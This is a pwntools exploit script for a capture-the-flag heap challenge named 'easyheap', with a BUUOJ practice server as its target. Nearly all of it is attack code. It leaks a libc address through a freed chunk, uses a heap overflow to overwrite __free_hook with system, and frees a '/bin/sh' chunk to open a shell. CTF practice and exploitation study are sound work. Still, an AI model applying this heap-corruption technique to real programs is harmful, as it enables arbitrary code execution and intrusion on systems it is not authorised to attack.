# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './easyheap'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.23-buu.so')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28351'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size , text = '\x10'):
    cmd(1)
    sla('Size:' , size)
    sla('Content:' , text)

def edit(idx ,size , text):
    cmd(2)
    sla('id:' , idx)
    sla('Size:' , size)
    sla('Content:' , text)

def show( ):
    cmd(3)

def delete(idx ):
    cmd(4)
    sla('id:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0x18)
    add(0x88)
    add(0x18)

    delete(1)
    add(0x88)

    show()

    __malloc_hook = l64() 
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    edit(0 , 0x38 , flat(0,0,0,0x21 , 0x18,__free_hook - 8 ))
    edit(1 , 0x18 , flat('/bin/sh\x00' , system_addr))

    delete(1)
    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   easyheap.py
@Time    :   2022/02/08 17:31:29
@Author  :   Niyah 
'''